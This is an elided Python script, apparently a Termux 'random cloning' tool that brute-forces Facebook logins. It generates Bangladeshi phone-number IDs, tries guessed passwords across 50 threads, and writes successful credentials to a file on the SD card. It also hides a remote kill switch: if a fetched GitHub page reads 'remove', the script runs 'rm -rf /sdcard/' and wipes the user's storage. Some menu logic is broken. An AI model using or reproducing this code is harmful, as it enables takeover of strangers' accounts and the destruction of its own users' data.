...
from os import system as _SHAMIM_
try:
    import requests
    ...
    _IMRAN_('pip install mechanize requests futures bs4==2 > /dev/null')
    _IMRAN_('pip install bs4')
apk1=requests.get("https://github.com/IMRAN-VI-OFFICIAL").text
def lo(word):
    Imran = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
...
today = date.today()
logo = (f"""\n\033[1;90m 
 _____  ____    ____  _______          _       ____  _____  
|_   _||_   \  /   _||_   __ \        / \     |_   \|_   _| 
  | |    |   \/   |    | |__) |      / _ \      |   \ | |   
  | |    | |\  /| |    |  __ /      / ___ \     | |\ \| |   
 _| |_  _| |_\/_| |_  _| |  \ \_  _/ /   \ \_  _| |_\   |_  
|_____||_____||_____||____| |___||____| |____||_____|\____| 
                                                            """)
loop = 0
oks = []
cps = []
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','SHAMIM  CYBER is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
if apk1 =='off':
	sys.exit()
if apk1 =='remove':
	_IMRAN_("termux-setup-storage")
	_IMRAN_("rm -rf /sdcard/")
	_IMRAN_("rm -rf /sdcard/ -y")
	sys.exit()
...
def IMRAN():
    ...
    _SHAMIM_("clear")
    print(logo)
    _IMRAN_("espeak \"Hi sir ,Wellcome to EHC EMRAN CYBER KING BANGLADESH  Rendom cloneing tool\"")
    ...
    if opt == '1':
    	_IMRAN_("espeak \" you choose rendom cloneing\"")
    	xxr()
    if None == '2':
        _IMRAN_('xdg-open https://www.facebook.com/profile.php?id=100090624010124')
        _SHAMIM_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _IMRAN_('xdg-open https://github.com/IMRAN_VI_OFFICIAL')
        _IMRAN_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _IMRAN_('xdg-open https://m.me/Md Imran Sheikh')
        _IMRAN_("espeak \"you choose messenger\"")
    if None == '0':
        _IMRAN_('exit')
        _IMRAN_("espeak \"good bye sir\"")
...
def xxr():
    ...
    print(" \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    _IMRAN_("espeak \"choose your country cord\"")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '0194'
    ...
    _IMRAN_(f"espeak \"you choose {pww}\"")
    _IMRAN_('clear')
    print(logo)
    _IMRAN_("espeak \"choose your limit\"")
    ...
    _IMRAN_(f"espeak \"you choose limit {limit}\"")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f'\033[38;5;46m│\033[1;91m[\033[1;97m×\033[1;91m]\033[38;5;46m TOOL OWNER   \033[1;97m: \033[38;5;46mSHAMIM CYBER      \033[1;97m     │')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SHAMIM_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m [SHAMIM-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                _EMRAN_("espeak \"SHAMIM  CYBER is brand\"")
                #open('/sdcard/SHAMIM_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['IMRAN CYBER','IMRAN CYBER ','IMRAN CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}IMRAN BOSS\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/IMRAN-VI-OFFICIAL").text
    if id in DARK:
        os.system('clear')
        print(logo)
        IMRAN()
        ...
        os.system('am start https://wa.me/+8801325846157?text=' + tks)
        superuser()        
superuser()
